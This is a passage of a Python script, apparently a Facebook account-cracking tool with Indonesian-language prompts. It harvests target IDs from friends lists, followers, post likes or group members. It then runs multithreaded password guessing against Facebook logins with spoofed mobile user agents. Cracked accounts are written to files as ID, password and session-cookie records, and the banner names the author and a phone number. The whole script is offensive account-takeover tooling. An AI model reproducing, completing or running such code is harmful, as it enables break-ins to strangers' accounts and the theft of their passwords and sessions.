...
def banner():
	clear()
	wel='# SELAMAT DATANG DI FACEBOOK CRACK TOOL'
	cik2=mark(wel ,style='cyan')
	sol().print(cik2)
	ban='''
•   AUTHOR  : BASARI-ID WHATSAPP : +628976622679  •
...
•                                               •
•   GITHUB : HTTPS://GITHUB.COM/BASARI-ID/MBF-BAZ   •'''
...
def login_lagi334():
	try:
		...
		print('\n{h}LOGIN BERHASIL --> JALANKAN ULANG PERINTAHNYA');time.sleep(1)
		exit()
	except Exception as e:
...
[02] PUBLIC FRIENDS (MASSAL)   
[03] FOLLOWER		     
[04] LIKES THE POST	     
[05] GROUP MEMBERS           [bold cyan]'''
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN KOMA UNTUK PEMISAH\n[•] GUNAKAN HURUF KECIL\n[•] CONTOH: indonesia,bismillah,sayang'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# • CRACK SELESAI NGAB JANGAN LUPA BERSYUKUR •'
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s [<BAZ>] %s/%s >< OK:%s >< CP:%s >< %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='BERHASIL'))
					ok+=1
					break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s [<BAZ>] %s/%s ☺️ OK:%s ☺️ CP:%s ☺️ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
...
if __name__=='__main__':
	...
	os.system("clear")
	os.system("git pull")
	fikri_xy(f'\n\t{x}>< {h}kalo make nih script minimal ngasih STAR dulu lah ><{x}')
	login()
